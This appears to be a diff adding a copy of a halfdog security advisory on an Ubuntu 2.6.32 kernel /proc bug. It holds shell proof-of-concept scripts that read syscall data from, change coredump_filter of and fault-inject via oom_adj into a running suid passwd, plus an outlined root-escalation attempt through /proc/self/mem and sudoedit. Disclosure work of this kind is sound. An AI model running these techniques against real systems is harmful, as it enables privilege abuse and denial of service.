@@ -1,0 +1,44 @@
+Source: http://www.halfdog.net/Security/2011/SuidBinariesAndProcInterface/
+
+# proc Handling of Already Opened Files: Subvert The Stack Base Address Randomization With Suid-Binaries
+
+Problem description: Latest ubuntu lucid stock kernel (2.6.32-27-generic) contains a bug that allows to keep attached to open /proc file entries as lower privileged user even after the process is executing suid binary. By doing that, a malicous user might draw information from the proc interface or even modify process settings of privileged process.
+Monitor syscalls, syscall stack, limits of running suid-binaries: A simple helper program (ProcReadHelper.c) is sufficient to open a proc entry before executing a suid program and keep it open. (SyscallReadExample.sh):
+#!/bin/bash
+(./ProcReadHelper /proc/$$/syscall) &
+sleep 1
+exec /usr/bin/passwd
+
+Output:
+
+Read 69 bytes:
+7 0xffffffff 0xbff646ac 0x0 0x0 0xf4d 0xbff646c8 0xbff64654 0x64b422
+Changing password for test.
+(current) UNIX password: Read 69 bytes:
+3 0x0 0xbffb4a84 0x1ff 0x0 0xbffb4a84 0xbffb4d18 0xbffb4814 0xf30422
+Read 69 bytes:
+3 0x0 0xbffb4a84 0x1ff 0x0 0xbffb4a84 0xbffb4d18 0xbffb4814 0xf30422
+
+The same can be done with /proc/[pid]/stack or /proc/[pid]/limits, where one can see how passwd increases its limits to unlimited after invocation.
+
+Modify core dump flags of running suid-binaries: Since proc is also writeable, the same technique can be used to modify open proc files, e.g. adjust the coredump filter of a currently running passwd program (ModifyCoreDumpFilter.sh):
+#!/bin/bash
+
+echo "Current pid is $$"
+(sleep 10; echo 127 ) > /proc/$$/coredump_filter &
+sleep 5
+exec /usr/bin/passwd
+
+Some open proc files can only be written by the process itself, e.g. /proc/[pid]/mem, a limitation that could be circumvented if any suid-binary echos out command line/input file/environment data, e.g. sudoedit -p xxx /etc/sudoers echos xxx. If /procc/[pid]/mem would be writeable on standard linux kernels, this program should give local root privilege escalation (SeekHelper.c), e.g. ./SeekHelper /proc/self/mem 8048000 /usr/bin/sudoedit -p xxx /etc/sudoers with a crafted address and promt payload. Currently something else is still blocking in kernel, could be fs/proc/base.c:
+
+static ssize_t mem_read(struct file * file, char __user * buf,
+                        size_t count, loff_t *ppos) {
+...
+    if (file->private_data != (void*)((long)current->self_exec_id))
+        goto out_put;
+
+Inject faults using oom_adjust: Some programs, e.g. from the shadow suite, try to disable all signals and limits to assure that critical code is not interrupted, e.g. modification of /etc/shadow when a unprivileged user changes his password. Since this program creates a lock file, interruption via oom_kill could leave stale lockfiles and so impede functionality.
+test@localhost:~/Tasks/LowMemoryProgramCrashing$ cat OomRun.sh
+#!/bin/bash
+(sleep 3; echo 15) > /proc/$$/oom_adj &
+exec /usr/bin/passwd
